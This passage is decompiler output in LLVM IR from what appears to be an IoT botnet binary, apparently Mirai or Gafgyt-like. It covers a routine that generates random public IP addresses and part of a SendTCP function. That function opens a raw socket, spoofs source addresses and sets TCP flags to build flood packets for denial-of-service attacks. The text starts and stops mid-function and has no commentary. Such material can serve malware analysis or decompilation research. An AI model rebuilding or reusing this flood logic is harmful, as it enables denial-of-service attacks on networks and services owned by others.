dec_label_pc_804ef8a:                             ; preds = %dec_label_pc_804ef7d, %dec_label_pc_804ef74, %dec_label_pc_804ef6b
  %v10_804ef8f = icmp eq i8 %v0_804ef55, 127
  br i1 %v10_804ef8f, label %dec_label_pc_804eee5, label %dec_label_pc_804ef97

dec_label_pc_804ef97:                             ; preds = %dec_label_pc_804ef8a
  %v11_804ef9c = icmp eq i8 %v0_804ef55, -87
  %v1_804ef9e = icmp eq i1 %v11_804ef9c, false
  br i1 %v1_804ef9e, label %dec_label_pc_804efad, label %dec_label_pc_804efa0

dec_label_pc_804efa0:                             ; preds = %dec_label_pc_804ef97
  %v0_804efa0 = load i8, i8* @global_var_8074485.250, align 1
  %v11_804efa5 = icmp eq i8 %v0_804efa0, -2
  br i1 %v11_804efa5, label %dec_label_pc_804eee5, label %dec_label_pc_804efad

dec_label_pc_804efad:                             ; preds = %dec_label_pc_804efa0, %dec_label_pc_804ef97
  %v11_804efb2 = icmp eq i8 %v0_804ef55, -84
  %v1_804efb4 = icmp eq i1 %v11_804efb2, false
  br i1 %v1_804efb4, label %dec_label_pc_804efcc, label %dec_label_pc_804efb6

dec_label_pc_804efb6:                             ; preds = %dec_label_pc_804efad
  %v0_804efb6 = load i8, i8* @global_var_8074485.250, align 1
  %tmp45 = icmp ult i8 %v0_804efb6, 17
  br i1 %tmp45, label %dec_label_pc_804efbf, label %dec_label_pc_804efcc

dec_label_pc_804efbf:                             ; preds = %dec_label_pc_804efb6
  br label %dec_label_pc_804eee5

dec_label_pc_804efcc:                             ; preds = %dec_label_pc_804efb6, %dec_label_pc_804efad
  %v8_804efd1 = icmp eq i8 %v0_804ef55, -64
  %v1_804efd3 = icmp eq i1 %v8_804efd1, false
  br i1 %v1_804efd3, label %dec_label_pc_804f00a, label %dec_label_pc_804efd5

dec_label_pc_804efd5:                             ; preds = %dec_label_pc_804efcc
  %v0_804efd5 = load i8, i8* @global_var_8074485.250, align 1
  %v4_804efda = icmp eq i8 %v0_804efd5, 0
  %v1_804efdc = icmp eq i1 %v4_804efda, false
  br i1 %v1_804efdc, label %dec_label_pc_804eff4, label %dec_label_pc_804efde

dec_label_pc_804efde:                             ; preds = %dec_label_pc_804efd5
  %v0_804efde = load i8, i8* @global_var_8074486.251, align 2
  %v10_804efe3 = icmp eq i8 %v0_804efde, 2
  br i1 %v10_804efe3, label %dec_label_pc_804eee5, label %dec_label_pc_804eff4

dec_label_pc_804eff4:                             ; preds = %dec_label_pc_804efde, %dec_label_pc_804efd5
  %v10_804eff9 = icmp eq i8 %v0_804efd5, 88
  %v1_804effb = icmp eq i1 %v10_804eff9, false
  br i1 %v1_804effb, label %dec_label_pc_804f013, label %dec_label_pc_804effd

dec_label_pc_804effd:                             ; preds = %dec_label_pc_804eff4
  %v0_804effd = load i8, i8* @global_var_8074486.251, align 2
  %v10_804f002 = icmp eq i8 %v0_804effd, 99
  br i1 %v10_804f002, label %dec_label_pc_804eee5, label %dec_label_pc_804f013

dec_label_pc_804f00a:                             ; preds = %dec_label_pc_804efcc
  br label %dec_label_pc_804f020

dec_label_pc_804f013:                             ; preds = %dec_label_pc_804effd, %dec_label_pc_804eff4
  %v11_804f018 = icmp eq i8 %v0_804efd5, -88
  br i1 %v11_804f018, label %dec_label_pc_804eee5, label %dec_label_pc_804f020

dec_label_pc_804f020:                             ; preds = %dec_label_pc_804f00a, %dec_label_pc_804f013
  %v11_804f025 = icmp eq i8 %v0_804ef55, -58
  %v1_804f027 = icmp eq i1 %v11_804f025, false
  br i1 %v1_804f027, label %dec_label_pc_804f043.thread, label %dec_label_pc_804f029

dec_label_pc_804f043.thread:                      ; preds = %dec_label_pc_804f020
  br label %dec_label_pc_804f062

dec_label_pc_804f029:                             ; preds = %dec_label_pc_804f020
  %v0_804f029 = load i8, i8* @global_var_8074485.250, align 1
  %v10_804f02e = icmp eq i8 %v0_804f029, 18
  br i1 %v10_804f02e, label %dec_label_pc_804eee5, label %dec_label_pc_804f036

dec_label_pc_804f036:                             ; preds = %dec_label_pc_804f029
  %v10_804f03b = icmp eq i8 %v0_804f029, 19
  br i1 %v10_804f03b, label %dec_label_pc_804eee5, label %dec_label_pc_804f04c

dec_label_pc_804f04c:                             ; preds = %dec_label_pc_804f036
  %v10_804f051 = icmp eq i8 %v0_804f029, 51
  %v1_804f053 = icmp eq i1 %v10_804f051, false
  br i1 %v1_804f053, label %dec_label_pc_804f062, label %dec_label_pc_804f055

dec_label_pc_804f055:                             ; preds = %dec_label_pc_804f04c
  %v0_804f055 = load i8, i8* @global_var_8074486.251, align 2
  %v10_804f05a = icmp eq i8 %v0_804f055, 100
  br i1 %v10_804f05a, label %dec_label_pc_804eee5, label %dec_label_pc_804f062

dec_label_pc_804f062:                             ; preds = %dec_label_pc_804f043.thread, %dec_label_pc_804f055, %dec_label_pc_804f04c
  %v11_804f067 = icmp eq i8 %v0_804ef55, -53
  %v1_804f069 = icmp eq i1 %v11_804f067, false
  br i1 %v1_804f069, label %dec_label_pc_804f081, label %dec_label_pc_804f06b

dec_label_pc_804f06b:                             ; preds = %dec_label_pc_804f062
  %v0_804f06b = load i8, i8* @global_var_8074485.250, align 1
  %v4_804f070 = icmp eq i8 %v0_804f06b, 0
  %v1_804f072 = icmp eq i1 %v4_804f070, false
  br i1 %v1_804f072, label %dec_label_pc_804f081, label %dec_label_pc_804f074

dec_label_pc_804f074:                             ; preds = %dec_label_pc_804f06b
  %v0_804f074 = load i8, i8* @global_var_8074486.251, align 2
  %v10_804f079 = icmp eq i8 %v0_804f074, 113
  br i1 %v10_804f079, label %dec_label_pc_804eee5, label %dec_label_pc_804f081

dec_label_pc_804f081:                             ; preds = %dec_label_pc_804f074, %dec_label_pc_804f06b, %dec_label_pc_804f062
  %tmp = icmp ult i8 %v0_804ef55, -32
  br i1 %tmp, label %dec_label_pc_804f08e, label %dec_label_pc_804eee5

dec_label_pc_804f08e:                             ; preds = %dec_label_pc_804f081
  store i32 0, i32* %stack_var_-32, align 4
  %v1_804f0aa = urem i32 %extract.t8, 256
  store i32 %v1_804f0aa, i32* @edx, align 4
  %v0_804f0b6 = load i8, i8* @global_var_8074486.251, align 2
  %v1_804f0b6 = zext i8 %v0_804f0b6 to i32
  store i32 %v1_804f0b6, i32* @ecx, align 4
  %v0_804f0c2 = load i8, i8* @global_var_8074485.250, align 1
  %v1_804f0c2 = zext i8 %v0_804f0c2 to i32
  store i32 %v1_804f0c2, i32* @ebx, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_806a055.253 to i32), i32* @esi, align 4
  %v2_804f0dd = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f0dd, i32* @edi, align 4
  %v7_804f0e9 = call i32 @szprintf(i32 %v2_804f0dd, i32 ptrtoint ([12 x i8]* @global_var_806a055.253 to i32), i32 %v1_804ef55, i32 %v1_804f0c2, i32 %v1_804f0b6, i32 %v1_804f0aa)
  %v1_804f0f8 = call i32 @inet_addr(i32 %v2_804f0dd)
  %v2_804f103 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f103, i32* @ebx, align 4
  store i32 %v0_804ee6e, i32* @esi, align 4
  store i32 %v0_804ee6d, i32* @edi, align 4
  ret i32 %v1_804f0f8

; uselistorder directives
  uselistorder i8 %v0_804ef74, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i8 17, { 0, 2, 1, 3 }
  uselistorder i8* @global_var_8074486.251, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_8074485.250, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i64 255, { 2, 0, 1, 3, 4 }
  uselistorder i8* @global_var_8074484.249, { 2, 1, 0 }
  uselistorder i32 223, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f062, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f020, { 1, 0 }
  uselistorder label %dec_label_pc_804ef55, { 1, 0 }
  uselistorder label %dec_label_pc_804eee5, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13 }
}

define i32 @SendTCP(i32* %arg1) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp50 = call i16 @__decompiler_undefined_function_2()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-20 = alloca i8*, align 4
  %tmp97 = ptrtoint i32* %arg1 to i32
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v15_804f10e = ptrtoint i32* %stack_var_-236 to i32
  store i32 %tmp97, i32* %eax.global-to-local, align 4
  %v2_804f122 = load i32, i32* %arg1, align 4
  store i32 %tmp97, i32* %eax.global-to-local, align 4
  %v1_804f12a = add i32 %tmp97, 4
  %v2_804f12a = inttoptr i32 %v1_804f12a to i32*
  %v3_804f12a = load i32, i32* %v2_804f12a, align 4
  store i32 %tmp97, i32* %eax.global-to-local, align 4
  %v1_804f133 = add i32 %tmp97, 8
  %v2_804f133 = inttoptr i32 %v1_804f133 to i32*
  %v3_804f133 = load i32, i32* %v2_804f133, align 4
  store i32 %tmp97, i32* %eax.global-to-local, align 4
  %v1_804f13c = add i32 %tmp97, 12
  %v2_804f13c = inttoptr i32 %v1_804f13c to i32*
  %v3_804f13c = load i32, i32* %v2_804f13c, align 4
  store i32 %tmp97, i32* %eax.global-to-local, align 4
  %v1_804f145 = add i32 %tmp97, 16
  %v2_804f145 = inttoptr i32 %v1_804f145 to i32*
  %v3_804f145 = load i32, i32* %v2_804f145, align 4
  store i32 %tmp97, i32* %eax.global-to-local, align 4
  %v1_804f14e = add i32 %tmp97, 20
  %v2_804f14e = inttoptr i32 %v1_804f14e to i32*
  %v3_804f14e = load i32, i32* %v2_804f14e, align 4
  store i32 %tmp97, i32* %eax.global-to-local, align 4
  %v1_804f157 = add i32 %tmp97, 24
  %v2_804f157 = inttoptr i32 %v1_804f157 to i32*
  %v3_804f157 = load i32, i32* %v2_804f157, align 4
  store i32 %v3_804f14e, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-92, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f169 = icmp eq i32 %v3_804f12a, 0
  %v1_804f16d = icmp eq i1 %v4_804f169, false
  br i1 %v1_804f16d, label %dec_label_pc_804f17a, label %dec_label_pc_804f16f

dec_label_pc_804f16f:                             ; preds = %entry
  %v1_804f16f = call i32 @rand_cmwc(i32 %v15_804f10e)
  store i32 %v1_804f16f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f192

dec_label_pc_804f17a:                             ; preds = %entry
  %v1_804f17d = urem i32 %v3_804f12a, 65536
  store i32 %v1_804f17d, i32* %eax.global-to-local, align 4
  %v5_804f182 = icmp ult i32* %stack_var_-236, inttoptr (i32 12 to i32*)
  store i1 %v5_804f182, i1* %cf.global-to-local, align 1
  %v1_804f186 = call i32 @htons(i32 %v1_804f17d)
  store i32 %v1_804f186, i32* %eax.global-to-local, align 4
  %v0_804f18b = load i32, i32* @esp, align 4
  %v2_804f18b = icmp ugt i32 %v0_804f18b, -17
  store i1 %v2_804f18b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f192

dec_label_pc_804f192:                             ; preds = %dec_label_pc_804f16f, %dec_label_pc_804f17a
  %v2_804f195 = ptrtoint i32* %stack_var_-92 to i32
  %v5_804f198 = icmp eq i32* %stack_var_-92, inttoptr (i32 -4 to i32*)
  store i1 %v5_804f198, i1* %cf.global-to-local, align 1
  %v15_804f198 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v15_804f198, i32* %eax.global-to-local, align 4
  %v3_804f19f = call i32 @getHost(i32 %v2_804f122, i32* nonnull %stack_var_-88)
  store i32 %v3_804f19f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f1a7 = icmp eq i32 %v3_804f19f, 0
  br i1 %v1_804f1a7, label %dec_label_pc_804f1b0, label %dec_label_pc_804f7e6

dec_label_pc_804f1b0:                             ; preds = %dec_label_pc_804f192
  %v5_804f1ba = icmp ugt i32* %stack_var_-92, inttoptr (i32 -9 to i32*)
  store i1 %v5_804f1ba, i1* %cf.global-to-local, align 1
  %v15_804f1ba = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v15_804f1ba, i32* %eax.global-to-local, align 4
  %v3_804f1be = bitcast i32* %stack_var_-84 to i8*
  %v4_804f1be = call i32 @__GI_memset(i8* %v3_804f1be, i32 0, i32 8)
  store i32 %v4_804f1be, i32* %eax.global-to-local, align 4
  %v5_804f1c6 = icmp ult i32* %stack_var_-236, inttoptr (i32 4 to i32*)
  store i1 %v5_804f1c6, i1* %cf.global-to-local, align 1
  %v3_804f1cf = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_804f1cf, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f1da = icmp eq i32 %v3_804f1cf, 0
  %v1_804f1de = icmp eq i1 %v4_804f1da, false
  br i1 %v1_804f1de, label %dec_label_pc_804f1e5, label %dec_label_pc_804f7e6

dec_label_pc_804f1e5:                             ; preds = %dec_label_pc_804f1b0
  store i32 1, i32* %stack_var_-96, align 4
  %v5_804f1ec = icmp ult i32* %stack_var_-236, inttoptr (i32 12 to i32*)
  store i1 %v5_804f1ec, i1* %cf.global-to-local, align 1
  %v2_804f1f1 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804f1f1, i32* %eax.global-to-local, align 4
  %v5_804f1fc = call i32 @__GI_setsockopt(i32 %v3_804f1cf, i32 0, i32 3, i32 %v2_804f1f1, i32 4)
  store i32 %v5_804f1fc, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804f204 = icmp slt i32 %v5_804f1fc, 0
  %v1_804f206 = icmp eq i1 %v2_804f204, false
  br i1 %v1_804f206, label %dec_label_pc_804f20d, label %dec_label_pc_804f7e6

dec_label_pc_804f20d:                             ; preds = %dec_label_pc_804f1e5
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f20d = icmp eq i32 %v3_804f157, 0
  %v1_804f211 = icmp eq i1 %v4_804f20d, false
  br i1 %v1_804f211, label %dec_label_pc_804f21c, label %dec_label_pc_804f232

dec_label_pc_804f21c:                             ; preds = %dec_label_pc_804f20d
  %v5_804f223 = sub i32 32, %v3_804f157
  %v10_804f223 = icmp ugt i32 %v3_804f157, 32
  store i1 %v10_804f223, i1* %cf.global-to-local, align 1
  store i32 %v5_804f223, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804f22b = urem i32 %v5_804f223, 32
  %v4_804f22b = icmp eq i32 %v2_804f22b, 0
  br i1 %v4_804f22b, label %bb117, label %bb

bb:                                               ; preds = %dec_label_pc_804f21c
  %v5_804f22b = shl i32 1, %v2_804f22b
  store i32 %v5_804f22b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb117

bb117:                                            ; preds = %dec_label_pc_804f21c, %bb
  %v0_804f22d = phi i32 [ 1, %dec_label_pc_804f21c ], [ %v5_804f22b, %bb ]
  %v1_804f22d = sub i32 0, %v0_804f22d
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804f22d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f232

dec_label_pc_804f232:                             ; preds = %dec_label_pc_804f20d, %bb117
  %storemerge16 = phi i32 [ %v1_804f22d, %bb117 ], [ 0, %dec_label_pc_804f20d ]
  %v1_804f235 = add i32 %v3_804f145, 40
  %v1_804f241 = add i32 %v3_804f145, 70
  %v2_804f244 = and i32 %v1_804f241, -16
  %v2_804f24a = sub i32 %v15_804f10e, %v2_804f244
  %v1_804f252 = add i32 %v2_804f24a, 15
  %v2_804f255 = and i32 %v1_804f252, -16
  store i32 %v2_804f255, i32* %edx.global-to-local, align 4
  %v1_804f26d = add i32 %v2_804f255, 20
  %v5_804f270 = inttoptr i32 %v1_804f26d to i16*
  %v1_804f276 = add i32 %v3_804f145, 20
  store i32 %v1_804f276, i32* %eax.global-to-local, align 4
  store i32 %v1_804f276, i32* @ebx, align 4
  %v5_804f27b = icmp ult i32 %v2_804f24a, 12
  store i1 %v5_804f27b, i1* %cf.global-to-local, align 1
  %v5_804f27e = add i32 %v2_804f24a, -16
  %v6_804f27e = inttoptr i32 %v5_804f27e to i32*
  store i32 %storemerge16, i32* %v6_804f27e, align 4
  %v2_804f281 = call i32 @getRandomPublicIP(i32 %v1_804f235, i32 %v2_804f255)
  store i32 %v2_804f281, i32* %eax.global-to-local, align 4
  %v0_804f286 = load i32, i32* @esp, align 4
  %v1_804f286 = add i32 %v0_804f286, 16
  %v5_804f289 = icmp ult i32 %v1_804f286, 12
  store i1 %v5_804f289, i1* %cf.global-to-local, align 1
  %v3_804f28c = inttoptr i32 %v0_804f286 to i32*
  store i32 %v2_804f281, i32* %v3_804f28c, align 4
  %v2_804f28d = call i32 @htonl(i32 %v1_804f26d)
  store i32 %v2_804f28d, i32* %eax.global-to-local, align 4
  %v0_804f292 = load i32, i32* @esp, align 4
  %v3_804f295 = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_804f295, i32* %edx.global-to-local, align 4
  %tmp = and i32 %v0_804f292, -4
  %v5_804f298 = icmp eq i32 %tmp, -16
  store i1 %v5_804f298, i1* %cf.global-to-local, align 1
  %v0_804f29b = load i32, i32* @ebx, align 4
  %v2_804f29b = add i32 %v0_804f292, 8
  %v3_804f29b = inttoptr i32 %v2_804f29b to i32*
  store i32 %v0_804f29b, i32* %v3_804f29b, align 4
  %v1_804f29c = add i32 %v0_804f292, 4
  %v2_804f29c = inttoptr i32 %v1_804f29c to i32*
  store i32 6, i32* %v2_804f29c, align 4
  %v3_804f29e = inttoptr i32 %v0_804f292 to i32*
  store i32 %v2_804f28d, i32* %v3_804f29e, align 4
  %v0_804f29f = load i32, i32* %edx.global-to-local, align 4
  %v2_804f29f = add i32 %v0_804f292, -4
  %v3_804f29f = inttoptr i32 %v2_804f29f to i32*
  store i32 %v0_804f29f, i32* %v3_804f29f, align 4
  %v5_804f2a0 = add i32 %v0_804f292, -8
  %v6_804f2a0 = inttoptr i32 %v5_804f2a0 to i32*
  store i32 %v2_804f255, i32* %v6_804f2a0, align 4
  %v0_804f2a3 = call i32 @makeIPPacket()
  store i32 %v0_804f2a3, i32* %eax.global-to-local, align 4
  %v0_804f2a8 = load i32, i32* @esp, align 4
  %v5_804f2a8 = icmp ugt i32 %v0_804f2a8, -25
  store i1 %v5_804f2a8, i1* %cf.global-to-local, align 1
  %v2_804f2ab = call i32 @rand_cmwc(i32 %v1_804f26d)
  %sext = mul i32 %v2_804f2ab, 65536
  %v1_804f2b0 = sdiv i32 %sext, 65536
  store i32 %v1_804f2b0, i32* %edx.global-to-local, align 4
  store i32 %v1_804f26d, i32* %eax.global-to-local, align 4
  %v1_804f2b5 = trunc i32 %v1_804f2b0 to i16
  store i16 %v1_804f2b5, i16* %v5_804f270, align 4
  %v2_804f2b8 = call i32 @rand_cmwc(i32 %v1_804f26d)
  %v2_804f2c2 = add i32 %v2_804f255, 24
  %v3_804f2c2 = inttoptr i32 %v2_804f2c2 to i32*
  store i32 %v2_804f2b8, i32* %v3_804f2c2, align 8
  store i32 %v1_804f26d, i32* %eax.global-to-local, align 4
  %v1_804f2c8 = add i32 %v2_804f255, 28
  %v2_804f2c8 = inttoptr i32 %v1_804f2c8 to i32*
  store i32 0, i32* %v2_804f2c8, align 4
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v1_804f2d2 = add i32 %v2_804f255, 32
  %v2_804f2d2 = inttoptr i32 %v1_804f2d2 to i8*
  %v3_804f2d2 = load i8, i8* %v2_804f2d2, align 16
  %v1_804f2d5 = urem i8 %v3_804f2d2, 16
  %v1_804f2d8 = or i8 %v1_804f2d5, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v1_804f2d8, i8* %v2_804f2d2, align 16
  store i32 %v3_804f13c, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v3_804f13c, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806985f.165 to i32), i32* @edi, align 4
  %v5_804f2fc = inttoptr i32 %v3_804f13c to i8*
  %v6_804f2fc = call i32 @_strncmp(i8* %v5_804f2fc, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806985f.165, i32 0, i32 0), i32 4)
  %v7_804f2fc = urem i32 %v6_804f2fc, 2
  %v8_804f2fc = icmp eq i32 %v7_804f2fc, 0
  %v0_804f2fe = load i1, i1* %cf.global-to-local, align 1
  %v2_804f2fe = or i1 %v0_804f2fe, %v8_804f2fc
  %v3_804f2fe = zext i1 %v2_804f2fe to i32
  %v4_804f2fe = load i32, i32* %edx.global-to-local, align 4
  %v5_804f2fe = and i32 %v4_804f2fe, -256
  %v6_804f2fe = or i32 %v3_804f2fe, %v5_804f2fe
  %v7_804f2fe = xor i32 %v6_804f2fe, 1
  store i32 %v7_804f2fe, i32* %edx.global-to-local, align 4
  %v1_804f306 = trunc i32 %v7_804f2fe to i8
  %v3_804f306 = zext i1 %v0_804f2fe to i8
  %v4_804f306 = sub nsw i8 %v1_804f306, %v3_804f306
  %v15_804f306 = icmp eq i8 %v4_804f306, 0
  %v2_804f30a = sext i8 %v4_804f306 to i32
  store i32 %v2_804f30a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f30f = icmp eq i1 %v15_804f306, false
  br i1 %v1_804f30f, label %dec_label_pc_804f35e, label %dec_label_pc_804f311

dec_label_pc_804f311:                             ; preds = %dec_label_pc_804f232
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v1_804f314 = add i32 %v2_804f255, 33
  %v2_804f314 = inttoptr i32 %v1_804f314 to i8*
  %v3_804f314 = load i8, i8* %v2_804f314, align 1
  %v4_804f314 = zext i8 %v3_804f314 to i32
  %v6_804f314 = and i32 %v2_804f30a, -256
  %v7_804f314 = or i32 %v6_804f314, %v4_804f314
  %v1_804f317 = or i32 %v7_804f314, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f317 = trunc i32 %v1_804f317 to i8
  store i32 %v1_804f317, i32* %eax.global-to-local, align 4
  store i8 %v3_804f317, i8* %v2_804f314, align 1
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v3_804f320 = load i8, i8* %v2_804f314, align 1
  %v4_804f320 = zext i8 %v3_804f320 to i32
  %v5_804f320 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f320 = and i32 %v5_804f320, -256
  %v7_804f320 = or i32 %v4_804f320, %v6_804f320
  %v1_804f323 = or i32 %v7_804f320, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f323 = trunc i32 %v1_804f323 to i8
  store i32 %v1_804f323, i32* %eax.global-to-local, align 4
  store i8 %v3_804f323, i8* %v2_804f314, align 1
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v3_804f32c = load i8, i8* %v2_804f314, align 1
  %v4_804f32c = zext i8 %v3_804f32c to i32
  %v5_804f32c = load i32, i32* %eax.global-to-local, align 4
  %v6_804f32c = and i32 %v5_804f32c, -256
  %v7_804f32c = or i32 %v4_804f32c, %v6_804f32c
  %v1_804f32f = or i32 %v7_804f32c, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f32f = trunc i32 %v1_804f32f to i8
  store i32 %v1_804f32f, i32* %eax.global-to-local, align 4
  store i8 %v3_804f32f, i8* %v2_804f314, align 1
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v3_804f338 = load i8, i8* %v2_804f314, align 1
  %v4_804f338 = zext i8 %v3_804f338 to i32
  %v5_804f338 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f338 = and i32 %v5_804f338, -256
  %v7_804f338 = or i32 %v4_804f338, %v6_804f338
  %v1_804f33b = or i32 %v7_804f338, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f33b = trunc i32 %v1_804f33b to i8
  store i32 %v1_804f33b, i32* %eax.global-to-local, align 4
  store i8 %v3_804f33b, i8* %v2_804f314, align 1
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v3_804f344 = load i8, i8* %v2_804f314, align 1
  %v4_804f344 = zext i8 %v3_804f344 to i32
  %v5_804f344 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f344 = and i32 %v5_804f344, -256
  %v7_804f344 = or i32 %v4_804f344, %v6_804f344
  %v1_804f347 = or i32 %v7_804f344, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f347 = trunc i32 %v1_804f347 to i8
  store i32 %v1_804f347, i32* %eax.global-to-local, align 4
  store i8 %v3_804f347, i8* %v2_804f314, align 1
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v3_804f350 = load i8, i8* %v2_804f314, align 1
  %v4_804f350 = zext i8 %v3_804f350 to i32
  %v5_804f350 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f350 = and i32 %v5_804f350, -256
  %v7_804f350 = or i32 %v4_804f350, %v6_804f350
  %v1_804f353 = or i32 %v7_804f350, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f353 = trunc i32 %v1_804f353 to i8
  store i32 %v1_804f353, i32* %eax.global-to-local, align 4
  store i8 %v3_804f353, i8* %v2_804f314, align 1
  br label %dec_label_pc_804f665

dec_label_pc_804f35e:                             ; preds = %dec_label_pc_804f232
  store i32 %v3_804f13c, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v3_804f13c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8069863.166 to i32), i32* @edi, align 4
  %v6_804f38e = call i32 @_strncmp(i8* %v5_804f2fc, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8069863.166, i32 0, i32 0), i32 5)
  %v7_804f38e = urem i32 %v6_804f38e, 2
  %v8_804f38e = icmp eq i32 %v7_804f38e, 0
  %v0_804f390 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f390 = or i1 %v0_804f390, %v8_804f38e
  %v3_804f390 = zext i1 %v2_804f390 to i32
  %v4_804f390 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f390 = and i32 %v4_804f390, -256
  %v6_804f390 = or i32 %v3_804f390, %v5_804f390
  %v7_804f390 = xor i32 %v6_804f390, 1
  store i32 %v7_804f390, i32* %edx.global-to-local, align 4
  %v1_804f398 = trunc i32 %v7_804f390 to i8
  %v3_804f398 = zext i1 %v0_804f390 to i8
  %v4_804f398 = sub nsw i8 %v1_804f398, %v3_804f398
  %v15_804f398 = icmp eq i8 %v4_804f398, 0
  %v2_804f39c = sext i8 %v4_804f398 to i32
  store i32 %v2_804f39c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f3a1 = icmp eq i1 %v15_804f398, false
  br i1 %v1_804f3a1, label %dec_label_pc_804f3cc, label %dec_label_pc_804f3a3

dec_label_pc_804f3a3:                             ; preds = %dec_label_pc_804f35e
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v1_804f3a6 = add i32 %v2_804f255, 33
  %v2_804f3a6 = inttoptr i32 %v1_804f3a6 to i8*
  %v3_804f3a6 = load i8, i8* %v2_804f3a6, align 1
  %v4_804f3a6 = zext i8 %v3_804f3a6 to i32
  %v6_804f3a6 = and i32 %v2_804f39c, -256
  %v7_804f3a6 = or i32 %v6_804f3a6, %v4_804f3a6
  %v1_804f3a9 = or i32 %v7_804f3a6, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f3a9 = trunc i32 %v1_804f3a9 to i8
  store i32 %v1_804f3a9, i32* %eax.global-to-local, align 4
  store i8 %v3_804f3a9, i8* %v2_804f3a6, align 1
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v3_804f3b2 = load i8, i8* %v2_804f3a6, align 1
  %v4_804f3b2 = zext i8 %v3_804f3b2 to i32
  %v5_804f3b2 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f3b2 = and i32 %v5_804f3b2, -256
  %v7_804f3b2 = or i32 %v4_804f3b2, %v6_804f3b2
  %v1_804f3b5 = or i32 %v7_804f3b2, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f3b5 = trunc i32 %v1_804f3b5 to i8
  store i32 %v1_804f3b5, i32* %eax.global-to-local, align 4
  store i8 %v3_804f3b5, i8* %v2_804f3a6, align 1
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v3_804f3be = load i8, i8* %v2_804f3a6, align 1
  %v4_804f3be = zext i8 %v3_804f3be to i32
  %v5_804f3be = load i32, i32* %eax.global-to-local, align 4
  %v6_804f3be = and i32 %v5_804f3be, -256
  %v7_804f3be = or i32 %v4_804f3be, %v6_804f3be
  %v1_804f3c1 = or i32 %v7_804f3be, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f3c1 = trunc i32 %v1_804f3c1 to i8
  store i32 %v1_804f3c1, i32* %eax.global-to-local, align 4
  store i8 %v3_804f3c1, i8* %v2_804f3a6, align 1
  br label %dec_label_pc_804f665

dec_label_pc_804f3cc:                             ; preds = %dec_label_pc_804f35e
  store i32 %v3_804f13c, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v3_804f13c, i32* @esi, align 4
